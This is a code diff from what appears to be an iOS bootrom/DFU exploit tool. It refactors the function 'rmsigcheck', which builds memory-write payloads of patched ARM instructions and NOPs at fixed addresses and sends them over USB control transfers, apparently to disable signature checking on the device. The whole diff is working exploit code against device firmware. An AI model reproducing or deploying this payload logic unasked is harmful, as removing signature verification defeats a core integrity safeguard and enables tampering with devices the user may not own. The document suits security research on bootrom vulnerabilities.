@@ -370,29 +370,41 @@ static void rmsigcheck(io_client_t client)
     memset(&blank, '\0', 2048);
     
     LOG_PROGRESS("[%s] running rmsigcheck()", __FUNCTION__);
+    
     // setup
-    unsigned char wBuf[128];
-    memset(&wBuf, '\0', 128);
+    unsigned char wBuf1[76];
+    unsigned char wBuf2[44];
+    memset(&wBuf1, '\0', 76);
+    memset(&wBuf2, '\0', 44);
     
     uint64_t dfu_image_base = 0x00000001800B0000;
     uint64_t write1         = 0x0000000100006c80;
     uint64_t write2         = 0x0000000100006ca8;
     
-    *(uint32_t*)(wBuf+ 0) = MEMC;
-    *(uint32_t*)(wBuf+ 4) = MEMC;
-    *(uint64_t*)(wBuf+16) = write1;
-    *(uint64_t*)(wBuf+24) = dfu_image_base + 16 + (3 * 8);
-    *(uint64_t*)(wBuf+32) = 9*4;
-    *(uint32_t*)(wBuf+40) = INSN_MOVZ_W1_1;
-    *(uint32_t*)(wBuf+44) = INSN_STRB_W1_SP_249;
-    *(uint32_t*)(wBuf+48) = INSN_STRB_W1_SP_251;
-    *(uint32_t*)(wBuf+52) = INSN_STRB_W1_SP_253;
-    *(uint32_t*)(wBuf+56) = INSN_NOP;
-    *(uint32_t*)(wBuf+60) = INSN_NOP;
-    *(uint32_t*)(wBuf+64) = INSN_NOP;
-    *(uint32_t*)(wBuf+68) = INSN_NOP;
-    *(uint32_t*)(wBuf+72) = INSN_NOP;
+    // build
+    *(uint32_t*)(wBuf1+ 0) = MEMC;
+    *(uint32_t*)(wBuf1+ 4) = MEMC;
+    *(uint64_t*)(wBuf1+16) = write1;
+    *(uint64_t*)(wBuf1+24) = dfu_image_base + 16 + (3 * 8);
+    *(uint64_t*)(wBuf1+32) = 9*4;
+    *(uint32_t*)(wBuf1+40) = INSN_MOVZ_W1_1;
+    *(uint32_t*)(wBuf1+44) = INSN_STRB_W1_SP_249;
+    *(uint32_t*)(wBuf1+48) = INSN_STRB_W1_SP_251;
+    *(uint32_t*)(wBuf1+52) = INSN_STRB_W1_SP_253;
+    *(uint32_t*)(wBuf1+56) = INSN_NOP;
+    *(uint32_t*)(wBuf1+60) = INSN_NOP;
+    *(uint32_t*)(wBuf1+64) = INSN_NOP;
+    *(uint32_t*)(wBuf1+68) = INSN_NOP;
+    *(uint32_t*)(wBuf1+72) = INSN_NOP;
     
+    *(uint32_t*)(wBuf2+ 0) = MEMC;
+    *(uint32_t*)(wBuf2+ 4) = MEMC;
+    *(uint64_t*)(wBuf2+16) = write2;
+    *(uint64_t*)(wBuf2+24) = dfu_image_base + 16 + (3 * 8);
+    *(uint64_t*)(wBuf2+32) = 1*4;
+    *(uint32_t*)(wBuf2+40) = INSN_NOP;
+    
+    // send
     LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_reset(client);
     io_close(client);
@@ -407,17 +419,15 @@ static void rmsigcheck(io_client_t client)
     LOG_PROGRESS("[%s] write1 setup", __FUNCTION__);
     result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 16);
     DEBUGLOG("[%s] write1 (1/4) %x", __FUNCTION__, result.ret);
-    
     result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, NULL, 0);
     DEBUGLOG("[%s] write1 (2/4) %x", __FUNCTION__, result.ret);
-    
     result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 6);
     DEBUGLOG("[%s] write1 (3/4) %x", __FUNCTION__, result.ret);
     result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 6);
     DEBUGLOG("[%s] write1 (4/4) %x", __FUNCTION__, result.ret);
     
     LOG_PROGRESS("[%s] sending payload", __FUNCTION__);
-    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, wBuf, 76);
+    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, wBuf1, 76);
     DEBUGLOG("[%s] write1 (1/2) %x", __FUNCTION__, result.ret);
     result = usb_ctrl_transfer(client, 0xa1, 2, 0xffff, 0x0000, NULL, 0);
     DEBUGLOG("[%s] write1 (2/2) %x", __FUNCTION__, result.ret);
@@ -433,28 +443,18 @@ static void rmsigcheck(io_client_t client)
         return;
     }
     
-    memset(&wBuf, '\0', 128);
-    *(uint32_t*)(wBuf+ 0) = MEMC;
-    *(uint32_t*)(wBuf+ 4) = MEMC;
-    *(uint64_t*)(wBuf+16) = write2;
-    *(uint64_t*)(wBuf+24) = dfu_image_base + 16 + (3 * 8);
-    *(uint64_t*)(wBuf+32) = 1*4;
-    *(uint32_t*)(wBuf+40) = INSN_NOP;
-    
     LOG_PROGRESS("[%s] write2 setup", __FUNCTION__);
     result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 16);
     DEBUGLOG("[%s] write2 (1/4) %x", __FUNCTION__, result.ret);
-    
     result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, NULL, 0);
     DEBUGLOG("[%s] write2 (2/4) %x", __FUNCTION__, result.ret);
-    
     result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 6);
     DEBUGLOG("[%s] write2 (3/4) %x", __FUNCTION__, result.ret);
     result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 6);
     DEBUGLOG("[%s] write2 (4/4) %x", __FUNCTION__, result.ret);
     
     LOG_PROGRESS("[%s] sending payload", __FUNCTION__);
-    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, wBuf, 44);
+    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, wBuf2, 44);
     DEBUGLOG("[%s] write2 (1/2) %x", __FUNCTION__, result.ret);
     result = usb_ctrl_transfer(client, 0xa1, 2, 0xffff, 0x0000, NULL, 0);
     DEBUGLOG("[%s] write2 (2/2) %x", __FUNCTION__, result.ret);
